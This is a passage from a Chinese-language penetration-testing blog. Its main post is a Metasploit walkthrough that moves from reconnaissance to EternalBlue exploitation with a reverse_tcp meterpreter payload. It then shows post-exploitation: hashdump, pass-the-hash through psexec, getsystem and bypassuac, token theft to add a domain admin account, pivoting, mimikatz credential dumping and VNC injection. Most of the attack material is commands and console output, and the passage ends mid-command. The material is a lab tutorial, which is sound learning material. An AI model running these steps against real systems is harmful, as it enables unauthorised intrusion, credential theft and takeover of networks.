</p><h2 id="web审计数据文件"><a href="#web审计数据文件" class="headerlink" title="web审计数据文件"></a>web审计数据文件</h2><p>1.http-fingerprints.lua<br>这个文件时一个lua table形式保存的数据文件，在这个文件中包含了一些常见的web应用信息，包含这些用用中关键文件所在的位置<br>2.http-sql-error.list<br>包含一些标识错误的字符串，主要被脚本http-sql-injection所使用。<br>3.http-web-files-extensions.lst<br>http-spider库文件在对页面进行扫描的过程 中狗就会使用该文件。包含了200多个常见的web应用扩展名。<br>4.http-devframework-fingerprints.lua<br>检测目标web应用所使用的语言<br>5.http-folders.txt<br>包含了九百多个HTTP常见的目录名，被脚本http-iis-webdav-vuln所调用，检测iis5/6类型服务器上传漏洞<br>6.vhosts-default.lst<br>脚本http-vhosts用这个数据文件来判断目标服务器是一个虚拟机还是一个真正的web服务器<br>7.wp-plugins.lst<br>包含了五万多个常见的wordpress初见的名称，脚本http-wordpress-plugins 利用此文件来对采用wordpress建站的服务器进行暴力穷举攻击<br>如果不特殊指定–srcipt-args http-wordpress-plungins.search ，此脚本只会读取前100个   </p><h2 id="DBMS-auding数据文件"><a href="#DBMS-auding数据文件" class="headerlink" title="DBMS-auding数据文件"></a>DBMS-auding数据文件</h2><p>1.mysql-cis.audit<br>主要根据CIA MYSQL V1.0.2 benchmark来检测mysql数据库的配置安全性。 mysql-audit脚本就是用了这个文件。<br>2.oracle-default-accounts.lst<br>用来验证oracle数据库的用户名。 被oracle-brute 和oracle-brute-stealth两个脚本所调用<br>3.oracle-sids<br>包含了常见的 oracle数据库实例名  </p><h1 id="namp脑图"><a href="#namp脑图" class="headerlink" title="namp脑图"></a>namp脑图</h1><p><img src="/posts/../../images/naotu/nmap.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>metasploit续</title>
      <link href="/posts/9e35f352.html"/>
      <url>/posts/9e35f352.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>1域名、dns信息收集<br>1)whois查询<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whois 域名|ip</span><br></pre></td></tr></table></figure></p><p>2)nslookup<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup 域名</span><br></pre></td></tr></table></figure></p><p>2.nmap<br>1)隐秘的tcp扫描和不ping。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -Pn ip</span><br></pre></td></tr></table></figure></p><p>2)Tcp空闲扫描<br>window上运行metasploit，线程数最好不要超过16，UXNIX平台上不要超过128<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ip/ipidseq </span><br><span class="line">msf auxiliary(ipidseq) &gt; show options</span><br><span class="line">msf auxiliary(ipidseq) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ipidseq) &gt; set threads 60</span><br><span class="line">threads =&gt; 60</span><br><span class="line">msf auxiliary(ipidseq) &gt; run</span><br></pre></td></tr></table></figure></p><p>发现空闲主机192.168.2.5可用于空闲扫描，对目标机进行扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf auxiliary(ipidseq) &gt;nmap -PN -sI 192.168.2.5 192.168.2.8</span><br></pre></td></tr></table></figure></p><p>3)msf中的db_nmap<br>4)查看metasploit的端口扫描工具<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; search portscan</span><br></pre></td></tr></table></figure></p><p>3.针对性扫描<br>1）服务器消息块协议扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure></p><p>2）搜寻配置不当的mssql<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping  </span><br><span class="line">msf auxiliary(mssql_ping) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(mssql_ping) &gt; set threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(mssql_ping) &gt; run</span><br></pre></td></tr></table></figure></p><p>3）ssh服务器扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;search ssh_version</span><br></pre></td></tr></table></figure></p><p>4)FTP扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/ftp/ftp_version   </span><br><span class="line">msf auxiliary(ftp_version) &gt; set threads 255</span><br><span class="line">threads =&gt; 255</span><br><span class="line">msf auxiliary(ftp_version) &gt; set rhosts 192.168.2.0/24</span><br><span class="line">rhosts =&gt; 192.168.2.0/24</span><br><span class="line">msf auxiliary(ftp_version) &gt; run</span><br></pre></td></tr></table></figure></p><p>5)简单的网络管理<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search snmp_login</span><br></pre></td></tr></table></figure></p><h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a><a href="https://blog.csdn.net/chengyu779394084/article/details/50602459" target="_blank" rel="noopener">漏洞扫描</a></h1><p>1.nexpose  </p><p>2.nessus<br>3.扫描开放的vnc空口令<br>最新版的vnc服务器不再允许使用空口令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use  auxiliary/scanner/vnc/vnc_none_auth</span><br></pre></td></tr></table></figure></p><p>4.扫描开放的x11服务器<br>x11在新的操作系统上不再使用的<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/x11/open_x11</span><br></pre></td></tr></table></figure></p><p>2.利用扫描结果进行自动化攻击  </p><p>利用autopwn自动攻击(不建议）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;db_connect postgres:toor@127.0.0.1/msf1</span><br><span class="line">db_import /root/nessus.nbe</span><br><span class="line">db_autopwn -e -t -r -x -p</span><br></pre></td></tr></table></figure></p><h1 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h1><p>1.渗透攻击基础 </p><p>msf中的命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;?</span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    advanced      Displays advanced options for one or more modules</span><br><span class="line">    back          Move back from the current context</span><br><span class="line">    banner        Display an awesome metasploit banner</span><br><span class="line">    cd            Change the current working directory</span><br><span class="line">    color         Toggle color</span><br><span class="line">    connect       Communicate with a host</span><br><span class="line">    edit          Edit the current module with $VISUAL or $EDITOR</span><br><span class="line">    exit          Exit the console</span><br><span class="line">    get           Gets the value of a context-specific variable</span><br><span class="line">    getg          Gets the value of a global variable</span><br><span class="line">    grep          Grep the output of another command</span><br><span class="line">    help          Help menu</span><br><span class="line">    info          Displays information about one or more modules</span><br><span class="line">    irb           Drop into irb scripting mode</span><br><span class="line">    jobs          Displays and manages jobs</span><br><span class="line">    kill          Kill a job</span><br><span class="line">    load          Load a framework plugin</span><br><span class="line">    loadpath      Searches for and loads modules from a path</span><br><span class="line">    makerc        Save commands entered since start to a file</span><br><span class="line">    options       Displays global options or for one or more modules</span><br><span class="line">    popm          Pops the latest module off the stack and makes it active</span><br><span class="line">    previous      Sets the previously loaded module as the current module</span><br><span class="line">    pushm         Pushes the active or list of modules onto the module stack</span><br><span class="line">    quit          Exit the console</span><br><span class="line">    reload_all    Reloads all modules from all defined module paths</span><br><span class="line">    rename_job    Rename a job</span><br><span class="line">    resource      Run the commands stored in a file</span><br><span class="line">    route         Route traffic through a session</span><br><span class="line">    save          Saves the active datastores</span><br><span class="line">    search        Searches module names and descriptions</span><br><span class="line">    sessions      Dump session listings and display information about sessions</span><br><span class="line">    set           Sets a context-specific variable to a value</span><br><span class="line">    setg          Sets a global variable to a value</span><br><span class="line">    show          Displays modules of a given type, or all modules</span><br><span class="line">    sleep         Do nothing for the specified number of seconds</span><br><span class="line">    spool         Write console output into a file as well the screen</span><br><span class="line">    threads       View and manipulate background threads</span><br><span class="line">    unload        Unload a framework plugin</span><br><span class="line">    unset         Unsets one or more context-specific variables</span><br><span class="line">    unsetg        Unsets one or more global variables</span><br><span class="line">    use           Selects a module by name</span><br><span class="line">    version       Show the framework and console library version numbers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    creds             List all credentials in the database</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br></pre></td></tr></table></figure></p><p>可用的渗透攻击模块<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;show exploits</span><br></pre></td></tr></table></figure></p><p>可用的辅助模块<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt;show auxiliary</span><br></pre></td></tr></table></figure></p><p>可用的攻击载荷<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure></p><p>2.永恒之蓝的利用<br>1)metasploit没有的集成的话去下载，或者更新到最新的。<br>ms17_010扫描模块的安装<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop# cp smb_ms17_010.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/</span><br></pre></td></tr></table></figure></p><p>漏洞利用脚本的安装<br>把模块下载到对应的目录(kali下metasploit存放模块的目录是/usr/share/metasploit-framework/modules/)<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/modules/exploits/windows/smb/ </span><br><span class="line"></span><br><span class="line">wget https://raw.githubusercontent.com/rapid7/metasploit-</span><br><span class="line">framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb</span><br></pre></td></tr></table></figure></p><p>2)漏洞扫描<br>nmap针对漏洞脚本的定向扫描<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -n -p445 --script smb-vuln-ms17-010 192.168.1.0/24 --open</span><br></pre></td></tr></table></figure></p><p>或者使用smb_ms17_010<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010 # 调用漏洞扫描模块</span><br><span class="line">show option # 查看模块配置选项</span><br><span class="line">set RHOST 192.168.1.1-254 # 配置扫描目标</span><br><span class="line">set THREADS 30 #配置扫描线程</span><br><span class="line">run #运行脚本</span><br></pre></td></tr></table></figure></p><p>3)开始攻击<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf&gt; use exploit/windows/smb/ms17_010_eternalblue # 调用ms17-010永恒之蓝漏洞攻击模块</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; show targets #查看攻击的有效对象</span><br><span class="line">msf exploit(windows/smb/ms17_010_eternalblue) &gt; info #查看详细信息 </span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; setg rhost 192.168.2.5 # 设定全局变量的攻击目标 192.168.2.5</span><br><span class="line">rhost =&gt; 192.168.2.5</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp # 调用反弹的攻击载荷</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; set lhost 192.168.2.3 # 设定将meterpreter反弹给192.168.2.3</span><br><span class="line">lhost =&gt; 192.168.2.3</span><br><span class="line">msf exploit(ms17_010_eternalblue) &gt; show options  # 查询攻击参数设置</span><br></pre></td></tr></table></figure></p><h1 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h1><p>1.常见命令<br>基本命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">background  # 让meterpreter处于后台模式  </span><br><span class="line">sessions -i index   # 与会话进行交互，index表示第一个session  </span><br><span class="line">quit  # 退出会话  </span><br><span class="line">shell # 获得控制台权限  </span><br><span class="line">irb # 开启ruby终端</span><br><span class="line">ps # 查看当前活跃进程  </span><br><span class="line">migrate  pid # 将Meterpreter会话移植到进程数位pid的进程中  </span><br><span class="line">kill pid # 杀死进程  </span><br><span class="line">getpid # 获取当前进程的pid  </span><br><span class="line">sysinfo # 查看目标机系统信息，如机器名，操作系统等  </span><br><span class="line"></span><br><span class="line">shutdown # 关机</span><br></pre></td></tr></table></figure><p>截屏<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;screenshot</span><br></pre></td></tr></table></figure></p><p>系统运行的平台信息<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;sysinfo</span><br></pre></td></tr></table></figure></p><p>查看进程和进程转移<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps       </span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure></p><p> 查看权限<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p><p>获取目标机器的工作目录和得到当前系统的工作目录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getwd  </span><br><span class="line">C:\Windows\system32</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getlwd </span><br><span class="line">/root</span><br></pre></td></tr></table></figure></p><p>上传文件到目标主机和下载目标文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; upload /root/1.txt c:\\</span><br><span class="line">[*] uploading  : /root/1.txt -&gt; c:\</span><br><span class="line">[*] uploaded   : /root/1.txt -&gt; c:\\1.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; download c:/2.txt /root </span><br><span class="line">[*] Downloading: c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] Downloaded 5.00 B of 5.00 B (100.0%): c:/2.txt -&gt; /root/2.txt</span><br><span class="line">[*] download   : c:/2.txt -&gt; /root/2.txt</span><br></pre></td></tr></table></figure></p><p>搜索目标主机上的文件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; search -h </span><br><span class="line">Usage: search [-d dir] [-r recurse] -f pattern [-f pattern]...</span><br><span class="line">Search for files.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -d &lt;opt&gt;  The directory/drive to begin searching from. Leave empty to search all drives. (Default: )</span><br><span class="line">    -f &lt;opt&gt;  A file pattern glob to search for. (e.g. *secret*.doc?)</span><br><span class="line">    -h        Help Banner.</span><br><span class="line">    -r &lt;opt&gt;  Recursivly search sub directories. (Default: true)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; search -d c:\\  -r flase -f *.txt</span><br><span class="line">Found 2 results...</span><br><span class="line">    c:\1.txt (2 bytes)</span><br><span class="line">    c:\2.txt (5 bytes)</span><br></pre></td></tr></table></figure></p><p>确定是不是虚拟机<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm  </span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-VONVJ6OMEQ7 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br></pre></td></tr></table></figure></p><p>开3389<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/enable_rdp</span><br><span class="line"></span><br><span class="line">[*] Enabling Remote Desktop</span><br><span class="line">[*] RDP is disabled; enabling it ...</span><br><span class="line">[*] Setting Terminal Services service startup mode</span><br><span class="line">[*] The Terminal Services service is not set to auto, changing it to auto ...</span><br><span class="line">[*] Opening port in local firewall if necessary</span><br><span class="line">[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20180430181213_default_192.168.1.187_host.windows.cle_516653.txt</span><br><span class="line">meterpreter &gt; netstat -ano</span><br><span class="line"></span><br><span class="line">Connection list</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">    Proto  Local address        Remote address      State        User  Inode  PID/Program name</span><br><span class="line">    -----  -------------        --------------      -----        ----  -----  ----------------</span><br><span class="line">    tcp    0.0.0.0:135          0.0.0.0:*           LISTEN       0     0      696/svchost.exe</span><br><span class="line">    tcp    0.0.0.0:445          0.0.0.0:*           LISTEN       0     0      4/System</span><br><span class="line">    tcp    0.0.0.0:3389         0.0.0.0:*           LISTEN       0     0      1040/svchost.exe</span><br></pre></td></tr></table></figure></p><p>远程主机的3389的端口映射到本机的1235号端口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 1234 -r 192.168.1.187 -p 3389</span><br><span class="line">[*] Local TCP relay created: :1234 &lt;-&gt; 192.168.1.187:3389</span><br></pre></td></tr></table></figure></p><p>创建新进程cmd.exe，-H不可见，-i交互<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; execute</span><br><span class="line">Usage: execute -f file [options]</span><br><span class="line"></span><br><span class="line">Executes a command on the remote machine.</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -H        Create the process hidden from view.</span><br><span class="line">    -a &lt;opt&gt;  The arguments to pass to the command.</span><br><span class="line">    -c        Channelized I/O (required for interaction).</span><br><span class="line">    -d &lt;opt&gt;  The &apos;dummy&apos; executable to launch when using -m.</span><br><span class="line">    -f &lt;opt&gt;  The executable command to run.</span><br><span class="line">    -h        Help menu.</span><br><span class="line">    -i        Interact with the process after creating it.</span><br><span class="line">    -k        Execute process on the meterpreters current desktop</span><br><span class="line">    -m        Execute from memory.</span><br><span class="line">    -s &lt;opt&gt;  Execute process in a given session as the session user</span><br><span class="line">    -t        Execute process with currently impersonated thread token</span><br><span class="line">meterpreter &gt; excte -H -f cmd.exe</span><br><span class="line">[-] Unknown command: excte.</span><br><span class="line">meterpreter &gt; execute -H -f cmd.exe</span><br><span class="line">Process 1840 created.</span><br></pre></td></tr></table></figure></p><p>2.获取密码哈希值<br>aad3b435开头的哈希值是一个空的或者不存在的哈希值–空字符串的占位符<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter &gt; run  post/windows/gather/hashdump</span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 24a05299b237d9f48c9eff1c6a88a57e...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line"></span><br><span class="line">No users with password hints on this system</span><br><span class="line"></span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure></p><p>3.用得到的管理员的用户哈希值登录<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/psexec):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   RHOST                                  yes       The target address</span><br><span class="line">   RPORT                 445              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share</span><br><span class="line">   SMBDomain             .                no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                no        The password for the specified username</span><br><span class="line">   SMBUser                                no        The username to authenticate as</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set rhost 192.168.1.187</span><br><span class="line">rhost =&gt; 192.168.1.187</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set lhost 192.168.1.130</span><br><span class="line">lhost =&gt; 192.168.1.130</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set lpost 4333</span><br><span class="line">lpost =&gt; 4333</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">SMBPass =&gt; aad3b435b51404eeaad3b435b51404ee:db3dd3018cff8541ab7168f899737020</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; set SMBUser Administrator</span><br><span class="line">SMBUser =&gt; Administrator</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.230:1444 </span><br><span class="line">[*] 192.168.1.187:445 - Connecting to the server...</span><br><span class="line">[*] 192.168.1.187:445 - Authenticating to 192.168.1.187:445 as user &apos;Administrator&apos;...</span><br><span class="line">[*] 192.168.1.187:445 - Selecting PowerShell target</span><br><span class="line">[*] 192.168.1.187:445 - Executing the payload...</span><br><span class="line">[+] 192.168.1.187:445 - Service start timed out, OK if running a command or non-service executable...</span><br><span class="line">[*] Sending stage (205891 bytes) to 192.168.1.187</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.1.230:1444 -&gt; 192.168.1.187:49468) at 2018-04-30 18:48:56 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p><p>4.权限提升<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use priv</span><br><span class="line">[-] The &apos;priv&apos; extension has already been loaded.</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></p><p>bypassuac </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf exploit(windows/smb/psexec) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure><p>5.令牌的假冒<br>1）incognito<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use incognito </span><br><span class="line">Loading extension incognito...Success.</span><br><span class="line">meterpreter &gt; list_tokens -u </span><br><span class="line"></span><br><span class="line">Delegation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">WIN-VONVJ6OMEQ7\Administrator</span><br><span class="line"></span><br><span class="line">Impersonation Tokens Available</span><br><span class="line">========================================</span><br><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure></p><p>2)ps 找到域管理员的pid参数(有时候不能看到）<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;ps </span><br><span class="line">meterpreter &gt; steal_token pid号 #盗取域管理员用户的令牌</span><br></pre></td></tr></table></figure></p><p>利用域管理员的令牌创建用户，并授予域管理员的权限<br>例子<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter&gt;impresonate_token SNEAKS.IN\\domianadmin</span><br><span class="line">meterpreter&gt;add_user qy qy -h 192.168.1.5 #-h是域管理员添加账号的地址</span><br><span class="line">meterpreter&gt;add_group_user &quot;Doamin Admins&quot; qy -h 192.168.1.5</span><br></pre></td></tr></table></figure></p><p>6.通过跳板攻击其他主机<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets #查看本地子网</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: 192.168.1.0/255.255.255.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; route add 192.168.2.0 255.255.255.0 1 #告诉系统将远程ID通过攻击会话1来进行路由</span><br><span class="line">[*] Route added</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; route print #显示当前活跃的路由信息</span><br><span class="line"></span><br><span class="line">IPv4 Active Routing Table</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.2.0        255.255.255.0      Session 1</span><br></pre></td></tr></table></figure></p><p>7.获取系统管理员的密码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID   Package    Domain        User              Password</span><br><span class="line">------   -------    ------        ----              --------</span><br><span class="line">0;996    Negotiate  WORKGROUP     WIN-VONVJ6OMEQ7$  </span><br><span class="line">0;46406  NTLM                                       </span><br><span class="line">0;997    Negotiate  NT AUTHORITY  LOCAL SERVICE     </span><br><span class="line">0;999    NTLM       WORKGROUP     WIN-VONVJ6OMEQ7$</span><br></pre></td></tr></table></figure></p><p>8.脚本的使用<br>1).vnc<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run vnc #在远程系统上安装vnc会话</span><br><span class="line">[*] Creating a VNC reverse tcp stager: LHOST=192.168.1.230 LPORT=4545</span><br><span class="line">[*] Running payload handler</span><br><span class="line">[*] VNC stager executable 73802 bytes long</span><br><span class="line">[*] Uploaded the VNC agent to C:\Windows\TEMP\jzoEGmzImp.exe (must be deleted manually)</span><br><span class="line">[*] Executing the VNC agent with endpoint 192.168.1.230:4545...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run screen_unlock # 对目标机器上的桌面进行解锁</span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/windows/escalate/screen_unlock.</span><br><span class="line">[!] Example: run post/windows/escalate/screen_unlock OPTION=value [...]</span><br><span class="line">[*] no working target found</span><br></pre></td></tr></table></figure></p><p>2).查看系统安装的软件<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WIN-VONVJ6OMEQ7</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> 2345好压                                                          v5.9</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2015 Redistributable (x64) - 14.0.24215    14.0.24215.1</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Additional Runtime - 14.0.24215   14.0.24215</span><br><span class="line"> Microsoft Visual C++ 2015 x64 Minimum Runtime - 14.0.24215      14.0.24215</span><br><span class="line"> Python 2.7.13 (64-bit)                                          2.7.13150</span><br><span class="line"> VMware Tools                                                    10.2.0.7259539</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20180501054603_default_192.168.1.187_host.application_930049.txt</span><br></pre></td></tr></table></figure></p><p>3)迁移到稳定的进程<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; 